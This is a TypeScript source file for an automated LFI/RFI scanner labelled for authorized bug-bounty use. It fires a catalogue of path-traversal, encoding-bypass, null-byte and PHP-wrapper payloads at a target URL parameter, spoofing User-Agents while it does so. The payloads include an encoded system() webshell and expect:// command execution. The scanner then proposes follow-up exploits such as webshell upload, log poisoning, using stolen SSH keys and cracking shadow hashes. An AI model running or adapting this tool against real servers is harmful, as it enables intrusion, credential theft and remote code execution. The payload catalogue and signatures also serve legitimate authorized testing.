// ─── LFI / RFI Scanner ────────────────────────────────────────────────────────
// Authorized security research / bug bounty use only.

// ─── Rotating User-Agents ─────────────────────────────────────────────────────
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
];
const randomUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

async function fetchSafe(url: string, timeoutMs: number): Promise<string | null> {
  for (let attempt = 0; attempt < 2; attempt++) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const r = await fetch(url, {
        signal: ctrl.signal,
        headers: {
          "User-Agent": randomUA(),
          "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Cache-Control": "no-cache",
          "Connection": "keep-alive",
        },
        redirect: "follow",
      });
      clearTimeout(t);
      return await r.text();
    } catch {
      clearTimeout(t);
      if (attempt === 1) return null;
      await new Promise(r => setTimeout(r, 300));
    }
  }
  return null;
}

// ─── LFI Detection Signatures ─────────────────────────────────────────────────
export interface LfiSignature {
  pattern: RegExp;
  label: string;
  severity: "critical" | "high" | "medium" | "low";
  description: string;
  cwe: string;
}

export const LFI_SIGNATURES: LfiSignature[] = [
  // /etc/passwd
  { pattern: /root:x?:0:0/i,                             label: "Linux /etc/passwd",       severity: "critical", description: "Server exposed /etc/passwd — user account enumeration possible", cwe: "CWE-22" },
  { pattern: /root:[\*!]?:[\d]+:[\d]+:/,                 label: "Linux /etc/shadow",       severity: "critical", description: "Possible /etc/shadow content — password hash exposure", cwe: "CWE-22" },
  { pattern: /daemon:x?:1:1/i,                           label: "Linux /etc/passwd (daemon)", severity: "critical", description: "/etc/passwd content confirmed via daemon entry", cwe: "CWE-22" },
  // Windows files
  { pattern: /\[boot loader\]/i,                         label: "Windows boot.ini",        severity: "critical", description: "Windows boot.ini exposed — system path information disclosed", cwe: "CWE-22" },
  { pattern: /\[operating systems\]/i,                   label: "Windows boot.ini (OS)",   severity: "critical", description: "Windows boot.ini [operating systems] section exposed", cwe: "CWE-22" },
  { pattern: /\[fonts\]\s*\[extensions\]/i,              label: "Windows win.ini",         severity: "critical", description: "Windows win.ini exposed", cwe: "CWE-22" },
  { pattern: /windows\s*nt/i,                            label: "Windows NT reference",    severity: "high",     description: "Windows NT path detected in response", cwe: "CWE-22" },
  // PHP source / errors
  { pattern: /Warning:\s+include\s*\(/i,                 label: "PHP include() warning",   severity: "high",     description: "PHP include() warning leaked — confirms LFI parameter", cwe: "CWE-22" },
  { pattern: /Warning:\s+require\s*\(/i,                 label: "PHP require() warning",   severity: "high",     description: "PHP require() warning — LFI confirmed", cwe: "CWE-22" },
  { pattern: /failed to open stream:\s*No such file/i,  label: "PHP stream error",        severity: "high",     description: "PHP stream error reveals include path", cwe: "CWE-22" },
  { pattern: /\bopen_basedir\b/i,                        label: "PHP open_basedir",        severity: "medium",   description: "open_basedir restriction error — LFI attempted but restricted", cwe: "CWE-22" },
  { pattern: /<\?php/i,                                  label: "PHP source exposed",      severity: "critical", description: "PHP source code exposed — file read successful", cwe: "CWE-22" },
  { pattern: /\bPHP Version\b.*\d+\.\d+/i,              label: "PHP info exposed",        severity: "high",     description: "phpinfo() or version string visible", cwe: "CWE-22" },
  // Apache / nginx config
  { pattern: /DocumentRoot\s+\//i,                      label: "Apache config exposed",   severity: "critical", description: "Apache httpd.conf DocumentRoot exposed", cwe: "CWE-22" },
  { pattern: /ServerName\s+\S+/i,                       label: "Apache ServerName",       severity: "high",     description: "Apache server configuration visible", cwe: "CWE-22" },
  { pattern: /server_name\s+\S+;/i,                     label: "Nginx config exposed",    severity: "critical", description: "Nginx nginx.conf content exposed", cwe: "CWE-22" },
  { pattern: /location\s+\/\s*\{/i,                     label: "Nginx location block",    severity: "critical", description: "Nginx location block exposed", cwe: "CWE-22" },
  // SSH / private keys
  { pattern: /-----BEGIN\s+(RSA\s+)?PRIVATE KEY-----/i, label: "Private key exposed",     severity: "critical", description: "SSH/TLS private key content detected — critical credential exposure", cwe: "CWE-22" },
  { pattern: /ssh-rsa\s+AAAA/i,                         label: "SSH authorized_keys",     severity: "critical", description: "SSH public key exposed — authorized_keys visible", cwe: "CWE-22" },
  // Proc / system
  { pattern: /Linux\s+version\s+[\d.]+/i,               label: "/proc/version",           severity: "high",     description: "Linux kernel version from /proc/version exposed", cwe: "CWE-22" },
  { pattern: /processor\s*:\s*\d+\s*vendor/i,           label: "/proc/cpuinfo",           severity: "medium",   description: "/proc/cpuinfo exposed — hardware info leak", cwe: "CWE-22" },
  { pattern: /MemTotal:\s*\d+\s*kB/i,                   label: "/proc/meminfo",           severity: "medium",   description: "/proc/meminfo exposed — memory info leak", cwe: "CWE-22" },
  // Web config
  { pattern: /\[database\]\s*\r?\n\s*host\s*=/i,       label: "DB config file",          severity: "critical", description: "Database configuration file exposed with connection details", cwe: "CWE-22" },
  { pattern: /DB_PASSWORD\s*=/i,                        label: ".env exposed",            severity: "critical", description: ".env file with DB_PASSWORD exposed", cwe: "CWE-22" },
  { pattern: /APP_KEY\s*=\s*base64:/i,                  label: "Laravel .env",            severity: "critical", description: "Laravel APP_KEY in .env exposed", cwe: "CWE-22" },
  { pattern: /SECRET_KEY\s*=\s*[a-z0-9]{20,}/i,        label: "Django secret key",       severity: "critical", description: "Django SECRET_KEY exposed", cwe: "CWE-22" },
  // MySQL / DB config
  { pattern: /\[mysqld\]/i,                             label: "my.cnf exposed",          severity: "critical", description: "MySQL my.cnf configuration exposed", cwe: "CWE-22" },
  { pattern: /password\s*=\s*[^\s\n]+/i,               label: "Password in config",      severity: "critical", description: "Password found in exposed configuration file", cwe: "CWE-22" },
  // Log files
  { pattern: /access\.log|error\.log/i,                 label: "Log file reference",      severity: "medium",   description: "Log file content visible — may contain sensitive data", cwe: "CWE-22" },
  { pattern: /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET\s+\//i, label: "Access log exposed", severity: "high", description: "Web server access log exposed — may enable log poisoning", cwe: "CWE-22" },
  // RFI-specific
  { pattern: /rfi_test_marker_alcame/i,                 label: "RFI canary confirmed",    severity: "critical", description: "Remote file inclusion confirmed via canary string", cwe: "CWE-98" },
];

// ─── Concurrency control ──────────────────────────────────────────────────────
async function withConcurrency<T>(tasks: (() => Promise<T>)[], limit: number): Promise<T[]> {
  const results: T[] = new Array(tasks.length);
  let idx = 0;
  async function worker() {
    while (idx < tasks.length) { const i = idx++; results[i] = await tasks[i](); }
  }
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
  return results;
}

// ─── Payload catalog ──────────────────────────────────────────────────────────
export interface LfiPayload {
  payload: string;
  label: string;
  category: "path_traversal" | "filter" | "wrapper" | "rfi" | "null_byte" | "encoding" | "truncation" | "proc";
  targetFile: string;
  platform: "linux" | "windows" | "any";
  wafBypass: boolean;
}

export const LFI_PAYLOADS: LfiPayload[] = [
  // ── Path traversal — Linux ────────────────────────────────────────────────
  { payload: "../../../../../../etc/passwd",           label: "etc/passwd 6-deep",    category: "path_traversal", targetFile: "/etc/passwd",             platform: "linux",   wafBypass: false },
  { payload: "../../../../../../../etc/passwd",        label: "etc/passwd 7-deep",    category: "path_traversal", targetFile: "/etc/passwd",             platform: "linux",   wafBypass: false },
  { payload: "../../../../../../../../etc/passwd",     label: "etc/passwd 8-deep",    category: "path_traversal", targetFile: "/etc/passwd",             platform: "linux",   wafBypass: false },
  { payload: "../../../../../../../../../etc/passwd",  label: "etc/passwd 9-deep",    category: "path_traversal", targetFile: "/etc/passwd",             platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/shadow",           label: "etc/shadow",           category: "path_traversal", targetFile: "/etc/shadow",             platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/hosts",            label: "etc/hosts",            category: "path_traversal", targetFile: "/etc/hosts",              platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/hostname",         label: "etc/hostname",         category: "path_traversal", targetFile: "/etc/hostname",           platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/issue",            label: "etc/issue",            category: "path_traversal", targetFile: "/etc/issue",              platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/os-release",      label: "etc/os-release",       category: "path_traversal", targetFile: "/etc/os-release",         platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/apache2/apache2.conf", label: "Apache config",   category: "path_traversal", targetFile: "/etc/apache2/apache2.conf",platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/nginx/nginx.conf", label: "Nginx config",        category: "path_traversal", targetFile: "/etc/nginx/nginx.conf",   platform: "linux",   wafBypass: false },
  { payload: "../../../../../../etc/mysql/my.cnf",    label: "MySQL config",         category: "path_traversal", targetFile: "/etc/mysql/my.cnf",       platform: "linux",   wafBypass: false },
  { payload: "../../../../../../root/.ssh/id_rsa",    label: "root SSH private key", category: "path_traversal", targetFile: "/root/.ssh/id_rsa",       platform: "linux",   wafBypass: false },
  { payload: "../../../../../../root/.bash_history",  label: "root bash history",    category: "path_traversal", targetFile: "/root/.bash_history",     platform: "linux",   wafBypass: false },
  { payload: "../../../../../../var/log/apache2/access.log", label: "Apache access log", category: "path_traversal", targetFile: "/var/log/apache2/access.log", platform: "linux", wafBypass: false },
  { payload: "../../../../../../var/log/nginx/access.log", label: "Nginx access log", category: "path_traversal", targetFile: "/var/log/nginx/access.log", platform: "linux", wafBypass: false },
  { payload: "../../../../../../proc/self/environ",   label: "/proc/self/environ",   category: "proc",           targetFile: "/proc/self/environ",      platform: "linux",   wafBypass: false },
  { payload: "../../../../../../proc/self/cmdline",   label: "/proc/self/cmdline",   category: "proc",           targetFile: "/proc/self/cmdline",      platform: "linux",   wafBypass: false },
  { payload: "../../../../../../proc/version",        label: "/proc/version",        category: "proc",           targetFile: "/proc/version",           platform: "linux",   wafBypass: false },
  { payload: "../../../../../../proc/net/tcp",        label: "/proc/net/tcp",        category: "proc",           targetFile: "/proc/net/tcp",           platform: "linux",   wafBypass: false },

  // ── Path traversal — Windows ─────────────────────────────────────────────
  { payload: "..\\..\\..\\..\\..\\..\\windows\\win.ini",     label: "win.ini",          category: "path_traversal", targetFile: "C:\\windows\\win.ini",          platform: "windows", wafBypass: false },
  { payload: "../../../../../../windows/win.ini",             label: "win.ini (fwd)",    category: "path_traversal", targetFile: "C:\\windows\\win.ini",          platform: "windows", wafBypass: false },
  { payload: "..\\..\\..\\..\\..\\boot.ini",                 label: "boot.ini",         category: "path_traversal", targetFile: "C:\\boot.ini",                  platform: "windows", wafBypass: false },
  { payload: "../../../../../../boot.ini",                    label: "boot.ini (fwd)",   category: "path_traversal", targetFile: "C:\\boot.ini",                  platform: "windows", wafBypass: false },
  { payload: "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", label: "Windows hosts", category: "path_traversal", targetFile: "Windows hosts", platform: "windows", wafBypass: false },

  // ── Null byte bypass ─────────────────────────────────────────────────────
  { payload: "../../../../../../etc/passwd%00",        label: "Null byte %00",        category: "null_byte",      targetFile: "/etc/passwd",             platform: "linux",   wafBypass: true },
  { payload: "../../../../../../etc/passwd\x00",       label: "Null byte raw",        category: "null_byte",      targetFile: "/etc/passwd",             platform: "linux",   wafBypass: true },
  { payload: "../../../../../../etc/passwd%00.php",    label: "Null byte + ext",      category: "null_byte",      targetFile: "/etc/passwd",             platform: "linux",   wafBypass: true },
  { payload: "../../../../../../etc/passwd%00.html",   label: "Null byte + html",     category: "null_byte",      targetFile: "/etc/passwd",             platform: "linux",   wafBypass: true },
  { payload: "../../../../../../etc/passwd%00.jpg",    label: "Null byte + jpg",      category: "null_byte",      targetFile: "/etc/passwd",             platform: "linux",   wafBypass: true },

  // ── Encoding bypass ──────────────────────────────────────────────────────
  { payload: "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",   label: "URL-encoded ../../etc/passwd", category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", label: "Full URL-encoded traversal", category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..%252F..%252F..%252F..%252Fetc%252Fpasswd",    label: "Double URL-encoded",           category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",       label: "Overlong UTF-8 /",             category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",       label: "Overlong UTF-8 \\",            category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..%u2215..%u2215etc%u2215passwd",                label: "Unicode slash bypass",         category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "....//....//....//....//etc/passwd",             label: "Double-slash bypass",          category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "....////....////etc////passwd",                  label: "Multiple slash bypass",        category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..././..././..././..././etc/passwd",              label: "Stripped ../ bypass",          category: "encoding", targetFile: "/etc/passwd", platform: "linux", wafBypass: true },
  { payload: "..%5C..%5C..%5C..%5Cetc%5Cpasswd",              label: "Backslash URL-encoded",        category: "encoding", targetFile: "/etc/passwd", platform: "any",   wafBypass: true },

  // ── PHP Wrappers ─────────────────────────────────────────────────────────
  { payload: "php://filter/convert.base64-encode/resource=index.php",      label: "PHP filter b64 index.php",   category: "wrapper", targetFile: "index.php",           platform: "linux", wafBypass: false },
  { payload: "php://filter/convert.base64-encode/resource=config.php",     label: "PHP filter b64 config.php",  category: "wrapper", targetFile: "config.php",          platform: "linux", wafBypass: false },
  { payload: "php://filter/convert.base64-encode/resource=../config.php",  label: "PHP filter b64 ../config",   category: "wrapper", targetFile: "../config.php",       platform: "linux", wafBypass: false },
  { payload: "php://filter/read=string.rot13/resource=index.php",          label: "PHP filter rot13",           category: "wrapper", targetFile: "index.php",           platform: "linux", wafBypass: false },
  { payload: "php://filter/read=convert.base64-encode/resource=/etc/passwd", label: "PHP filter /etc/passwd",  category: "wrapper", targetFile: "/etc/passwd",         platform: "linux", wafBypass: false },
  { payload: "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd", label: "PHP filter traversal passwd", category: "wrapper", targetFile: "/etc/passwd", platform: "linux", wafBypass: false },
  { payload: "php://input",                                                 label: "php://input",                category: "wrapper", targetFile: "POST body",           platform: "linux", wafBypass: false },
  { payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+", label: "data:// RCE base64", category: "wrapper", targetFile: "RCE via data://",    platform: "linux", wafBypass: false },
  { payload: "expect://id",                                                 label: "expect:// RCE",              category: "wrapper", targetFile: "RCE via expect://",   platform: "linux", wafBypass: false },
  { payload: "zip://shell.jpg%23shell.php",                                 label: "zip:// wrapper",             category: "wrapper", targetFile: "zip wrapper",         platform: "linux", wafBypass: false },

  // ── Truncation bypass (old PHP < 5.3) ────────────────────────────────────
  { payload: `../../../../../../etc/passwd${"/./".repeat(512)}`,           label: "Path length truncation",     category: "truncation", targetFile: "/etc/passwd",        platform: "linux", wafBypass: true },
  { payload: `../../../../../../etc/passwd${".".repeat(240)}`,             label: "Dot truncation",             category: "truncation", targetFile: "/etc/passwd",        platform: "linux", wafBypass: true },

  // ── RFI (Remote File Inclusion) ───────────────────────────────────────────
  { payload: "http://example.com/rfi_test_marker_alcame",       label: "RFI HTTP",           category: "rfi", targetFile: "Remote HTTP",       platform: "any", wafBypass: false },
  { payload: "https://example.com/rfi_test_marker_alcame",      label: "RFI HTTPS",          category: "rfi", targetFile: "Remote HTTPS",      platform: "any", wafBypass: false },
  { payload: "//example.com/rfi_test_marker_alcame",            label: "RFI protocol-relative", category: "rfi", targetFile: "Remote //",      platform: "any", wafBypass: false },
  { payload: "ftp://example.com/rfi_test_marker_alcame",        label: "RFI FTP",            category: "rfi", targetFile: "Remote FTP",        platform: "any", wafBypass: false },
  { payload: "http://example.com/rfi_test_marker_alcame%00",    label: "RFI + null byte",    category: "rfi", targetFile: "Remote + null",     platform: "any", wafBypass: true },
  { payload: "http://example.com/rfi_test_marker_alcame?",      label: "RFI + query term",   category: "rfi", targetFile: "Remote + query",    platform: "any", wafBypass: true },
];

// ─── Hit result ───────────────────────────────────────────────────────────────
export interface LfiHit {
  param: string;
  payload: string;
  label: string;
  category: LfiPayload["category"];
  platform: LfiPayload["platform"];
  signature: string;
  severity: LfiSignature["severity"];
  cwe: string;
  description: string;
  evidence: string;
  wafBypass: boolean;
  isRfi: boolean;
}

export interface LfiParamResult {
  name: string;
  vulnerable: boolean;
  severity: LfiSignature["severity"] | "none";
  hits: LfiHit[];
  totalTested: number;
  wafDetected: boolean;
  rfiConfirmed: boolean;
  phpWrapperConfirmed: boolean;
  suggestedExploits: string[];
}

// ─── Detection helpers ────────────────────────────────────────────────────────
function detectLfiInResponse(html: string): LfiSignature | null {
  for (const sig of LFI_SIGNATURES) {
    if (sig.pattern.test(html)) return sig;
  }
  return null;
}

function detectWaf(resp: string, statusCode: number): boolean {
  if ([403, 406, 501].includes(statusCode)) return true;
  return /cloudflare|sucuri|modsecurity|blocked|access denied|not acceptable|security|firewall/i.test(resp.slice(0, 2000));
}

const SEV_RANK: Record<string, number> = { none: 0, low: 1, medium: 2, high: 3, critical: 4 };
function worstSev(s: string[]): LfiSignature["severity"] | "none" {
  const best = s.reduce((b, v) => (SEV_RANK[v] ?? 0) > (SEV_RANK[b] ?? 0) ? v : b, "none");
  return best as LfiSignature["severity"] | "none";
}

function suggestExploits(result: LfiParamResult): string[] {
  const out: string[] = [];
  if (result.rfiConfirmed) out.push("Remote File Inclusion → upload PHP webshell and include via RFI for RCE");
  if (result.phpWrapperConfirmed) out.push("PHP filter wrapper → use php://filter/convert.base64-encode to read all PHP source files");
  if (result.hits.some(h => h.signature === "Linux /etc/passwd")) out.push("/etc/passwd read → enumerate system users, pivot to /etc/shadow for cracking");
  if (result.hits.some(h => h.signature === "/proc/version")) out.push("/proc/version read → identify kernel version, check for kernel exploits");
  if (result.hits.some(h => h.label.includes("log"))) out.push("Log file read → poison logs via User-Agent injection, then include for RCE (log poisoning)");
  if (result.hits.some(h => h.signature === "Private key exposed")) out.push("SSH private key exposed → download and use for direct server access");
  if (result.hits.some(h => /config|env/i.test(h.label))) out.push("Config/env file exposed → extract database credentials, API keys, encryption secrets");
  if (result.hits.some(h => h.signature === "PHP source exposed")) out.push("PHP source exposed → audit source for additional vulnerabilities (SQLi, IDOR, auth bypass)");
  if (out.length === 0 && result.vulnerable) out.push("LFI confirmed → enumerate more sensitive paths: SSH keys, config files, log files");
  return out;
}

// ─── Per-parameter scanner ────────────────────────────────────────────────────
export async function scanLfiParameter(
  baseUrl: URL,
  paramName: string,
  timeoutMs: number,
  onHit?: (hit: LfiHit) => void
): Promise<LfiParamResult> {
  let wafDetected = false;
  let rfiConfirmed = false;
  let phpWrapperConfirmed = false;

  const tasks = LFI_PAYLOADS.map((p) => async (): Promise<LfiHit | null> => {
    const testUrl = new URL(baseUrl.toString());
    testUrl.searchParams.set(paramName, p.payload);

    const html = await fetchSafe(testUrl.toString(), timeoutMs);
    if (!html) return null;

    const statusMatch = html.match(/^HTTP\/[\d.]+ (\d+)/);
    const statusCode = statusMatch ? parseInt(statusMatch[1]) : 200;

    if (detectWaf(html, statusCode)) wafDetected = true;

    const sig = detectLfiInResponse(html);
    if (!sig) return null;

    const isRfi = p.category === "rfi";
    const isPhpWrapper = p.category === "wrapper" && /base64|rot13/.test(html) && html.length > 100;

    if (isRfi) rfiConfirmed = true;
    if (isPhpWrapper || (p.category === "wrapper" && sig)) phpWrapperConfirmed = true;

    const evidenceIdx = html.search(sig.pattern);
    const evidence = html.slice(Math.max(0, evidenceIdx - 60), Math.min(html.length, evidenceIdx + 200)).trim();

    const hit: LfiHit = {
      param: paramName, payload: p.payload, label: p.label,
      category: p.category, platform: p.platform,
      signature: sig.label, severity: sig.severity, cwe: sig.cwe,
      description: sig.description, evidence: evidence.slice(0, 400),
      wafBypass: p.wafBypass, isRfi,
    };
    onHit?.(hit);
    return hit;
  });

  const rawResults = await withConcurrency(tasks, 15);
  const hits = rawResults.filter((r): r is LfiHit => r !== null);
  const result: LfiParamResult = {
    name: paramName,
    vulnerable: hits.length > 0,
    severity: worstSev(hits.map(h => h.severity)),
    hits,
    totalTested: LFI_PAYLOADS.length,
    wafDetected,
    rfiConfirmed,
    phpWrapperConfirmed,
    suggestedExploits: [],
  };
  result.suggestedExploits = suggestExploits(result);
  return result;
}
